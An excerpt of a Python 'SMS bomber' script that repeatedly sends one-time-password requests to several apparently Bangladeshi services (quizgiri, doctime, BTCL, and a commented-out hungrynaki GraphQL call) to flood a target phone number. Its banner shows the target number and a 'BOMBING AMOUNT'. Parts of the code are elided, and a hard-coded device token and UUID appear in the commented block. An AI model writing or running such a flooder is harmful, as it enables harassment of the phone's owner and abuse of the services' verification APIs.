...
def sent_pin(number, amount):
    ...
    ══════════════════════════════════════
           PHONE : {phone}       
      {random.choice(colorArr)}      BOMBING AMOUNT : {amount}        
      {random.choice(colorArr)}     YOUR IP : {ip}
    ══════════════════════════════════════
    '''
    clr()
    banner()
    ...
    while i < amount:
        ...
        try:
            ...
            if requ_quizgiri_server.json()['message'] == 'OTP sent successful':
                i += 1
                print_text = "[" + str(i) + "]"
                sys.stdout.write(print_text)
                sys.stdout.flush()
        ...
        try:
            ...
            if requ_doctime_server.json()['message'] == 'Contact verification code has been sent to 01990722540!':
                i += 1
                print_text = "[" + str(i) + "]"
                sys.stdout.write(print_text)
                sys.stdout.flush()
        ...
        try:
            ...
            if resp.json()['message'] == 'An OTP has been sent to 88'+ numberTwo +'.':
                i += 1
                print_text = "[" + str(i) + "]"
                sys.stdout.write(print_text)
                sys.stdout.flush()
        ...
        try:
            ...
            data_btcl = '{"OTPType": 1,"email": null,"phoneNbr": "' + numberTwo + '","userName": ""}'
            requ_btcl_server = requests.post(url_btcl, headers=headers_btcl, data=data_btcl)
            if requ_btcl_server.json()['message'] == 'Success！':
                i += 1
                print_text = "[" + str(i) + "]"
                sys.stdout.write(print_text)
                sys.stdout.flush()
...
def att(number_multi):
    ...
    #for num in numbers_all:
         # hungrynaki
         #try:
         ##  headers_hungrynaki = CaseInsensitiveDict()
          #  headers["Content-Type"] = "application/json"
          #  data_hungrynaki = '{"operationName": "CreateOtp","variables": {"phoneNo": "' + num + '","countryCode": "880","fcmToken": "dynHErXhSmSAQzHC2XAh5C:APA91bHRThTZZxMIXPYKXMiU37NWMoz-ld1GIbHqCq6-QB7-Ww93TFE078DTL0GSW_OPMZggoMEatqz_P2DP361dWbxVBBfcf4L5kPzIBSnomRGaTjdYJrUsXMEiB7F5DH0rkTB2QyR_","deviceUuid": "84a6013a-e6cf-44be-8ddd-dc77792e0136","device": {"deviceType": "ANDROID","osVersionCode": "LOLLIPOP_MR1","osVersionRelease": "6.0.1","deviceBrand": "samsung","deviceModel": "SM-G532F","deviceManufacturer": "samsung","sdk": "23","appInfo": {"versionName": "5.0.8","versionCode": 5000086}}},"query": "mutation CreateOtp($phoneNo:PhoneNumber!, $countryCode:String!, $fcmToken:String, $deviceUuid:String!, $device:CreateDeviceInput!) { createOtp(auth: {phone: $phoneNo, countryCode: $countryCode, deviceToken: $fcmToken, deviceUuid: $deviceUuid}, device:$device) { __typename message statusCode } }"}'
           # requ_hungrynaki = requests.post(url_hungrynaki, headers=headers_hungrynaki, data=data_hungrynaki)

          #  if requ_hungrynaki.json()["message"] == "OTP Sended successfully.":
          #      printchar(f"{greenBold}    A SMS SENT FROM HUNGRYNAKI IN +888{num}", 0.001)
    
          #  else:
          #      printchar(f"{redBold}    A SMS NOT SENT FROM HUNGRYNAKI IN +888{num}", 0.001)
       # except:
          #  pass
          #  print("\n")
    for num in numbers_all:
